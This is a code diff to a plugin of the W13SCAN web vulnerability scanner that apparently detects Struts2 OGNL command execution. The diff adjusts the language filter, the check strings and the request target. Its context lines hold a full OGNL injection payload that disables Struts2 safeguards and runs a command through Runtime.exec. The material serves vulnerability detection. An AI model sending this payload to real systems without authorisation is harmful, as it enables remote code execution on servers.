@@ -34,8 +34,8 @@ class W13SCAN(PluginBase):
         params = self.requests.params
         netloc = self.requests.netloc
 
-        # if not self.response.language or self.response.language != "ASP":
-        #     return
+        if self.response.language is None or self.response.language == "JAVA":
+            return
 
         if method == 'GET':
             exi = os.path.splitext(p.path)[1]
@@ -47,7 +47,7 @@ class W13SCAN(PluginBase):
             ran_check = ran_a - ran_b
             lin = 'expr' + ' ' + str(ran_a) + ' - ' + str(ran_b)
 
-            checks = [str(ran_check), '无法初始化设备 PRN', '??????? PRN', 'Struts2-vuln-Check',
+            checks = [str(ran_check), '无法初始化设备 PRN', '??????? PRN',
                       'Unable to initialize device PRN']
             payloads = [
                 r"(%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003dfalse%27)(bla)(bla)&(%27\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET%27)(kxlzx)(kxlzx)&(%27\u0023mycmd\u003d\%27print test\%27%27)(bla)(bla)&(%27\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)%27)(bla)(bla)&(A)((%27\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())%27)(bla))&(B)((%27\u0023myres\u003dnew\40byte[51020]%27)(bla))&(C)((%27\u0023mydat.readFully(\u0023myres)%27)(bla))&(D)((%27\u0023mystr\u003dnew\40java.lang.String(\u0023myres)%27)(bla))&(%27\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()%27)(bla)(bla)&(E)((%27\u0023myout.getWriter().println(\u0023mystr)%27)(bla))",
@@ -55,7 +55,7 @@ class W13SCAN(PluginBase):
             ]
             headers['Content-Type'] = 'application/x-www-form-urlencoded'
             for payload in payloads:
-                r = requests.post(netloc, headers=headers, data=payload)
+                r = requests.post(url, headers=headers, data=payload)
                 html1 = r.text
                 for check in checks:
                     if check in html1:
